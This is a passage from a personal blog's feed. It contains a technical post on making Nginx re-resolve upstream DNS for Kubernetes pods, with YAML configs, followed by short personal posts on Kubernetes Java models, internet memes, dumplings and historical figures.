registering Pod IPs directly as A records for <code>foo.example.com.</code>. I started noticing that after my Pod
IPs changed either because of rescheduling or updating the Deployment, Nginx started throwing
<code>502 Bad Gateway</code> errors.</p>

<h3>Root Problem</h3>

<p>Nginx resolves statically configured domain names only once at startup or configuration
reload time. So Nginx resolved <code>foo.example.com.</code> once at startup to several Pod IPs and cached
them forever.</p>

<h3>Solution</h3>

<!-- more -->


<p>Using a variable for the domain name will make Nginx resolve and cache it using the TTL value of the
DNS response. So replace the <code>upstream</code> block with a variable. I have no idea why it has to be a
variable to make Nginx resolve the domain periodically.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>set $foo_url foo.example.com.;</span></code></pre></td></tr></table></div></figure>


<p>And replace the <code>proxy_pass</code> line with</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  location ~* /_foo/(.*) {
</span><span class='line'>    proxy_pass https://$foo_url/$1;
</span><span class='line'>    ...
</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>


<p>This behavior isn&rsquo;t documented but has been observed empirically and discussed <a href="https://serverfault.com/a/593003/88755">here</a>, <a href="https://stackoverflow.com/a/41476524/553994">here</a>,
and <a href="https://www.ruby-forum.com/t/using-127-0-0-1-in-resolver/238180/4">here</a>. I also learned that this setup requires me to define a <code>resolver</code> in the Nginx configs.
<strong>For some reason Nginx resolves statically configured domains by querying the nameserver specified in
<code>/etc/resolv.conf</code> but periodically resolved domains require a completely different config
setting.</strong> I would love to know why.</p>

<p>The VM on which Nginx was running ran a Bind DNS server locally, so I set <code>resolver 127.0.0.1</code>.
I triggered the code path that made Nginx send requests to foo and saw periodic DNS queries
occurring with <code>sudo tcpdump -i lo -n dst port 53 | grep foo</code>.</p>

<h2>What if that Nginx is also running on K8s?</h2>

<h3>Problem</h3>

<p>I had another Nginx instance that also made requests to foo. This Nginx was running on K8s too. It
was created with this Deployment YAML.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">apps/v1</span>
</span><span class='line'><span class="l-Scalar-Plain">kind</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Deployment</span>
</span><span class='line'><span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx</span>
</span><span class='line'><span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">selector</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">matchLabels</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx</span>
</span><span class='line'>  <span class="l-Scalar-Plain">template</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">labels</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx</span>
</span><span class='line'>    <span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">containers</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx</span>
</span><span class='line'>        <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">openresty/openresty:trusty</span>
</span><span class='line'>        <span class="l-Scalar-Plain">ports</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">https</span>
</span><span class='line'>            <span class="l-Scalar-Plain">containerPort</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">443</span>
</span><span class='line'>            <span class="l-Scalar-Plain">protocol</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">TCP</span>
</span><span class='line'>        <span class="l-Scalar-Plain">volumeMounts</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config</span>
</span><span class='line'>            <span class="l-Scalar-Plain">mountPath</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/etc/nginx/conf.d</span>
</span><span class='line'>      <span class="l-Scalar-Plain">volumes</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config</span>
</span><span class='line'>          <span class="l-Scalar-Plain">configMap</span><span class="p-Indicator">:</span>
</span><span class='line'>            <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>nginx-config</code> ConfigMap was</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">v1</span>
</span><span class='line'><span class="l-Scalar-Plain">kind</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">ConfigMap</span>
</span><span class='line'><span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config</span>
</span><span class='line'><span class="l-Scalar-Plain">data</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">nginx.conf</span><span class="p-Indicator">:</span> <span class="p-Indicator">|</span>
</span><span class='line'>    <span class="no">upstream foo {</span>
</span><span class='line'>      <span class="no">server foo.example.com.:443;</span>
</span><span class='line'>    <span class="no">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="no">server {</span>
</span><span class='line'>      <span class="no">...</span>
</span><span class='line'>
</span><span class='line'>      <span class="no"># use regex capture to preserve url path and query params</span>
</span><span class='line'>      <span class="no">location ~* /_foo/(.*) {</span>
</span><span class='line'>        <span class="no">proxy_pass https://foo/$1;</span>
</span><span class='line'>        <span class="no">...</span>
</span><span class='line'>      <span class="no">}</span>
</span><span class='line'>    <span class="no">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>I replaced <code>upstream</code> with the same pattern above, but in this case when I needed to define
<code>resolver</code> I couldn&rsquo;t use <code>127.0.0.1</code> because there&rsquo;s no Bind running locally. I can&rsquo;t hardcode the
resolver because it might change.</p>

<h3>Solution: run Nginx and foo on the same K8s cluster and use the cluster-local Service DNS record</h3>

<p>If Nginx and foo run on the same K8s cluster, I can use the cluster-local DNS record created by a
K8s Service matching the foo Pods. A Service like this</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">v1</span>
</span><span class='line'><span class="l-Scalar-Plain">kind</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Service</span>
</span><span class='line'><span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">foo</span>
</span><span class='line'>  <span class="l-Scalar-Plain">namespace</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">bar</span>
</span><span class='line'><span class="nn">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>will create a DNS A record <code>foo.bar.svc.cluster.local.</code> pointing to the K8s Service&rsquo;s IP.
Since this Service&rsquo;s IP is stable and it load balances requests to the underlying Pods, there&rsquo;s no need for Nginx to
periodically lookup the Pod IPs. I can keep the <code>upstream</code> block like so.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">upstream foo {</span>
</span><span class='line'>  <span class="l-Scalar-Plain">server foo.bar.svc.cluster.local.:443;</span>
</span><span class='line'><span class="l-Scalar-Plain">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>As its name implies, <code>foo.bar.svc.cluster.local.</code> is only resolvable within the cluster. So
Nginx has to be running on the same cluster as foo.</p>

<h3>Solution: dynamically set the Nginx <code>resolver</code> equal to the system&rsquo;s when the Pod starts</h3>

<p><strong>Disclaimer: This &ldquo;solution&rdquo; is more of an ugly, brittle hack that should only be used as a last
resort.</strong></p>

<p>What if Nginx is on another K8s cluster? Then I can set <code>resolver</code> to the IP of one of the
nameservers in <code>/etc/resolv.conf</code>. After a bunch of tinkering I came up with this way to dynamically
set the Nginx <code>resolver</code> when the Pod starts. A placeholder for <code>resolver</code> is set in the Nginx
ConfigMap, and a command at Pod startup copies over the templated config and replaces the
placeholder with a nameserver IP from <code>/etc/resolv.conf</code>.</p>

<p>Change <code>nginx-config</code> ConfigMap to</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">v1</span>
</span><span class='line'><span class="l-Scalar-Plain">kind</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">ConfigMap</span>
</span><span class='line'><span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config</span>
</span><span class='line'><span class="l-Scalar-Plain">data</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">nginx.conf.template</span><span class="p-Indicator">:</span> <span class="p-Indicator">|</span>
</span><span class='line'>    <span class="no">server {</span>
</span><span class='line'>      <span class="no">...</span>
</span><span class='line'>
</span><span class='line'>      <span class="no"># This directive is dynamic because we set it to the</span>
</span><span class='line'>      <span class="no"># kube-dns Service IP which is different for each cluster.</span>
</span><span class='line'>      <span class="no">resolver $NAMESERVER;</span>
</span><span class='line'>
</span><span class='line'>      <span class="no">set $foo_url foo.example.com.;</span>
</span><span class='line'>
</span><span class='line'>      <span class="no"># use regex capture to preserve url path and query params</span>
</span><span class='line'>      <span class="no">location ~* /_foo/(.*) {</span>
</span><span class='line'>        <span class="no">proxy_pass https://$foo_url/$1;</span>
</span><span class='line'>        <span class="no">...</span>
</span><span class='line'>      <span class="no">}</span>
</span><span class='line'>    <span class="no">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Deployment YAML then becomes (note the added <code>command</code>, <code>args</code>, and new <code>volume</code> and <code>volumeMount</code>).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">apps/v1</span>
</span><span class='line'><span class="l-Scalar-Plain">kind</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Deployment</span>
</span><span class='line'><span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx</span>
</span><span class='line'><span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">selector</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">matchLabels</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx</span>
</span><span class='line'>  <span class="l-Scalar-Plain">template</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">labels</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx</span>
</span><span class='line'>    <span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">containers</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx</span>
</span><span class='line'>        <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">openresty/openresty:trusty</span>
</span><span class='line'>        <span class="l-Scalar-Plain">command</span><span class="p-Indicator">:</span> <span class="p-Indicator">[</span><span class="s">&#39;/bin/bash&#39;</span><span class="p-Indicator">,</span> <span class="s">&#39;-c&#39;</span><span class="p-Indicator">]</span>
</span><span class='line'>        <span class="l-Scalar-Plain">args</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="p-Indicator">|</span>
</span><span class='line'>          <span class="no">export NAMESERVER=$(grep &#39;nameserver&#39; /etc/resolv.conf | awk &#39;{print $2}&#39; | tr &#39;\n&#39; &#39; &#39;)</span>
</span><span class='line'>          <span class="no">echo &quot;Nameserver is: $NAMESERVER&quot;</span>
</span><span class='line'>          <span class="no">echo &#39;Copying nginx config&#39;</span>
</span><span class='line'>          <span class="no">envsubst &#39;$NAMESERVER&#39; &lt; /etc/nginx/conf.d.template/nginx.conf.template &gt; /etc/nginx/conf.d/nginx.conf</span>
</span><span class='line'>          <span class="no">echo &#39;Using nginx config:&#39;</span>
</span><span class='line'>          <span class="no">cat /etc/nginx/conf.d/nginx.conf</span>
</span><span class='line'>          <span class="no">echo &#39;Starting nginx&#39;</span>
</span><span class='line'>          <span class="no">nginx -g &#39;daemon off;&#39;</span>
</span><span class='line'>        <span class="l-Scalar-Plain">ports</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">https</span>
</span><span class='line'>            <span class="l-Scalar-Plain">containerPort</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">443</span>
</span><span class='line'>            <span class="l-Scalar-Plain">protocol</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">TCP</span>
</span><span class='line'>        <span class="l-Scalar-Plain">volumeMounts</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config-template</span>
</span><span class='line'>            <span class="l-Scalar-Plain">mountPath</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/etc/nginx/conf.d.template</span>
</span><span class='line'>          <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config</span>
</span><span class='line'>            <span class="l-Scalar-Plain">mountPath</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/etc/nginx/conf.d</span>
</span><span class='line'>      <span class="l-Scalar-Plain">volumes</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config</span>
</span><span class='line'>          <span class="l-Scalar-Plain">emptyDir</span><span class="p-Indicator">:</span> <span class="p-Indicator">{}</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config-template</span>
</span><span class='line'>          <span class="l-Scalar-Plain">configMap</span><span class="p-Indicator">:</span>
</span><span class='line'>            <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx-config</span>
</span></code></pre></td></tr></table></div></figure>


<p>A <code>volume</code> of type <code>emptyDir</code> is needed because recent versions of K8s made configMap volumes
read-only. EmptyDir types are writable.</p>

<p>Hopefully this helps some people out there who don&rsquo;t want to spend as much time as I did Googling
obscure Nginx behavior.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Using Upstream Kubernetes Java Models Is Much Better Than Raw YAML]]></title>
    <link href="https://www.davidxia.com/2018/11/using-upstream-kubernetes-java-models-is-much-better-than-raw-yaml/"/>
    <updated>2018-11-11T17:11:38-05:00</updated>
    <id>https://www.davidxia.com/2018/11/using-upstream-kubernetes-java-models-is-much-better-than-raw-yaml</id>
    <content type="html"><![CDATA[<p>It&rsquo;s been a while since I blogged about something tech related, but I had some
free time today.</p>

<p>Recently, I&rsquo;ve been trying to refactor an internal Spotify deployment tool my
team built and maintains. This deployment tool takes Kubernetes (k8s) YAML
manifests, changes them, and essentially runs <code>kubectl apply</code>. We add metadata
to the k8s manifests like labels.</p>

<p>Right now this tool receives the input YAML as strings, converts them to
Jackson ObjectNodes, and manipulates those ObjectNodes. The disadvantage of
this is that there&rsquo;s no k8s type-safety. We might accidentally add a field to a
Deployment that isn&rsquo;t valid or remove something from a Service that&rsquo;s required.</p>

<p>My refactor uses upstream k8s model classes from <a href="https://github.com/kubernetes-client/java">kubernetes-client/java</a>
which are themselves <a href="https://github.com/kubernetes-client/gen">generated</a> from the official Swagger spec. Here&rsquo;s a
helpful Yaml utility class that deserializes YAML strings into concrete classes
and can also serialize them back into YAML strings. So helpful.</p>

<p>Unfortunately, there&rsquo;s some bugs in the YAML (de)serialization that prevent me
from finishing this effort.</p>

<ul>
<li><a href="https://github.com/kubernetes-client/java/pull/417">kubernetes-client/java issue 417</a></li>
<li><a href="https://github.com/kubernetes-client/java/issues/431">kubernetes-client/java issue 431</a></li>
<li><a href="https://github.com/kubernetes-client/java/issues/340">kubernetes-client/java issue 340</a></li>
</ul>


<p>Nonetheless, it&rsquo;ll be much nicer to change k8s resources in a type-safe way
instead of parsing and rewriting raw YAML strings.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Internet Meme Role Models]]></title>
    <link href="https://www.davidxia.com/2018/01/internet-meme-role-models/"/>
    <updated>2018-01-07T11:29:18-05:00</updated>
    <id>https://www.davidxia.com/2018/01/internet-meme-role-models</id>
    <content type="html"><![CDATA[<p>I&rsquo;m compiling a list of Internet meme role models. Here&rsquo;s what I have so far. These people &mdash;
they must be real human beings &mdash; must have either gone out of their way to do the right
thing in a smart manner, something courageous with bonus points for being funny, or just be
ridiculous. And they must be memeified. Exceptions will be made for exceptional but not
memeified people like Hilde Lysiak.</p>

<p>Who else deserves to be on this list?</p>

<ul>
<li><a href="https://www.youtube.com/watch?v=b58mzz7mQpg">Snack Man</a> defused a violent fight on the subway between a couple before anyone got hurt. He did
it by standing in between them and munching on Pringles and Gummy Bears.</li>
<li><a href="https://www.youtube.com/watch?v=m9Md78SJO6s">Ben Innes</a> asked the EgyptAir Flight 181 hijacker who comandeered the airplane with a fake
explosive belt if he could take a selfie with him. &ldquo;I thought, why not? If he blows us all up it
won&rsquo;t matter anyway.&rdquo;</li>
<li><a href="https://www.nytimes.com/2017/10/31/books/hilde-lysiak-child-reporter.html">Hilde Lysiak</a> is ten years old and the writer and publisher of Orange Street News.
She <a href="https://www.youtube.com/watch?v=0ShfNQOUeAY">doesn&rsquo;t take shit from anyone</a>.</li>
<li>Salt Bae is&hellip;well you just have to <a href="https://www.youtube.com/watch?v=xWMWJwXvzWk&amp;t=376s">see for yourself</a>.</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Now Max Knows How to Make a Latte]]></title>
    <link href="https://www.davidxia.com/2017/08/now-max-knows-how-to-make-a-latte/"/>
    <updated>2017-08-30T01:19:06-04:00</updated>
    <id>https://www.davidxia.com/2017/08/now-max-knows-how-to-make-a-latte</id>
    <content type="html"><![CDATA[<p>I work at a music company but am more interested in politics and history. Artists visit our
office often.</p>

<p>So I, often being ignorant of their fame, have casually interacted with them or criticized their
milk steaming techniques when they&rsquo;re using the office&rsquo;s $20K espresso machine.</p>

<p>Only later am I told by their posse, &ldquo;Did you know that was Mark Ronson/Bebe Rhexa/Max Martin/etc?&rdquo;</p>

<p>&ldquo;It&rsquo;s OK,&rdquo; I say. &ldquo;Now Max knows how to make a real latte.&rdquo;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Making Dumplings With My Grandparents]]></title>
    <link href="https://www.davidxia.com/2017/07/making-dumplings-with-my-grandparents/"/>
    <updated>2017-07-05T22:50:03-04:00</updated>
    <id>https://www.davidxia.com/2017/07/making-dumplings-with-my-grandparents</id>
    <content type="html"><![CDATA[<p>Whenever I go back home to my parents&#8217; house near Boston,
if my maternal grandparents are there, they make hundreds of dumplings for me.
I try to help out. We make everything from scratch including the skins. I&rsquo;m good at rolling the
skins but have much to learn on all other parts of the process. I&rsquo;m becoming better at packing
and closing the dumplings now though.</p>

<p>I&rsquo;ve come to cherish this little tradition more and more. I need to plan my next trip to Boston!</p>

<p><img class="center" src="https://i.imgur.com/FkpZb8Jh.jpg"></p>

<!-- more -->


<p><img class="center" src="https://i.imgur.com/InwCZuBh.jpg"></p>

<p><img class="center" src="https://i.imgur.com/bT9F8neh.jpg"></p>

<p><img class="center" src="https://i.imgur.com/qMkalGoh.jpg"></p>

<iframe class="fill-width" width="560" height="315" src="https://www.youtube.com/embed/shNvpsrlaF0" frameborder="0" allowfullscreen></iframe>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Four Fascinating and Weird People]]></title>
    <link href="https://www.davidxia.com/2017/06/four-fascinating-and-weird-people/"/>
    <updated>2017-06-01T06:36:06-04:00</updated>
    <id>https://www.davidxia.com/2017/06/four-fascinating-and-weird-people</id>
    <content type="html"><![CDATA[<p>Here are the stories of four fascinating and weird people that will make you laugh, be inspired,
or cringe. Chang and Eng Bunker were conjoined twins who married two sisters and were slave-owners
on the side of the Southern Confederacy. Rose Wilder Lane is the daughter of the author who wrote
the <em>Little House</em> childrens books, a founding member of the American Libertarian movement, and just
all around boss ass bitch. John Harvey Kellogg was the inventor of corn flakes, doctor, zealous
anti-masturbation campaigner, and eugenicist.</p>

<!-- more -->


<h2>1. Chang and Eng Bunker</h2>

<p><a href="https://en.wikipedia.org/wiki/Chang_and_Eng_Bunker">Chang and Eng</a> were two conjoined twins born
in Vietnam in the 1800s. The term &ldquo;Siamese twins&rdquo; is based on them.</p>

<blockquote><p>The brothers were joined at the sternum by a small piece of cartilage, and though their livers
  were fused, they were independently complete.</p></blockquote>

<p>After a Scotsman noticed them and paraded them around as a freak show attraction for ten
years, the Bunker twins settled down in Wilkesboro, North Carolina. They married two local white
women who were sisters. They became naturalized American citizens and even owned slaves.</p>

<p>The Bunkers and their wives slept in a bed built for four. After a while their wives started to not
get along. So they alternated between two different houses. Chang had twelve children while
Eng had ten. Today their descendents number more than 1,500 and hold reunions. Their liver is on
display in at the Mütter Museum in Philadelphia, Pennsylvania.</p>

<h2>2. Rose Wilder Lane</h2>

<p><a href="https://en.wikipedia.org/wiki/Rose_Wilder_Lane">Rose Wilder Lane</a> was the eldest child of Laura
Ingalls Wilder, the ostensible author of the <a href="https://en.wikipedia.org/wiki/List_of_Little_House_on_the_Prairie_books">Little House book series</a>.
Lane was by all means a boss ass bitch who lived a full life.</p>

<p>Sick of crop failures and tough frontier life, Lane moved in 1908 to San Francisco, California.
She married a salesman named Gillette Lane and became pregnant. Sadly, her son was stillborn, and
a subsequent surgery left her unable to have kids.</p>

<blockquote><p>She felt her intellectual interests did not mesh with the life she was living with her husband.
Keenly aware of her lack of a formal education, during these years, Lane read voraciously and
taught herself several languages. Her writing career began around 1908, with occasional
freelance newspaper jobs that earned much-needed extra cash.</p><footer><strong>Early career, marriage and divorce</strong> <cite><a href='https://en.wikipedia.org/wiki/Rose_Wilder_Lane#Early_career.2C_marriage_and_divorce'>en.wikipedia.org/wiki/&hellip;</a></cite></footer></blockquote>


<p>Lane&rsquo;s writing career took off. She wrote for publications like <em>Harper&rsquo;s</em> and <em>Saturday Evening
Post</em>.</p>

<blockquote><p>In the late 1920s, Lane was reputed to be one of the highest-paid female writers in America, and
along with Hoover, she counted among her friends well known figures such as Sinclair Lewis,
Isabel Paterson, Dorothy Thompson, John Patric, and Lowell Thomas.</p><footer><strong>Freelance writing career</strong> <cite><a href='https://en.wikipedia.org/wiki/Rose_Wilder_Lane#Freelance_writing_career'>en.wikipedia.org/wiki/&hellip;</a></cite></footer></blockquote>


<p>When Lane&rsquo;s mother approached her with a rough autobiographical manuscript of her own childhood,
Lane sensed that an American public fatigued by the Great Depression would take to the story of
the loving, persistent, and independent Ingalls family. Lane encouraged and helped her mother
rewrite and sell the story as a children&rsquo;s novel. The book became a big success, and an entire
series replete with T.V. shows, merchandise, and museums followed. Their family was raking
in the dough.</p>

<p>I read the entire series as a kid and stil wax nostalgic for it. I thought Lane&rsquo;s mother, who&rsquo;s the
titled author, wrote every book on her own and only received encouragement from her Lane. It turns
out, however, that the truth is more interesting.</p>

<blockquote><p>&#8230;an ongoing mutual collaboration that involved Lane more extensively in the
earlier books, and to a much lesser extent by the time the series ended, as Wilder&#8217;s confidence
in her own writing ability increased. Lane insisted to the end that her role was little more than
that of her mother&#8217;s adviser, despite documentation to the contrary&#8230;Literary historians
believe that Lane&#8217;s editing skills brought the dramatic pacing, literary structure, and
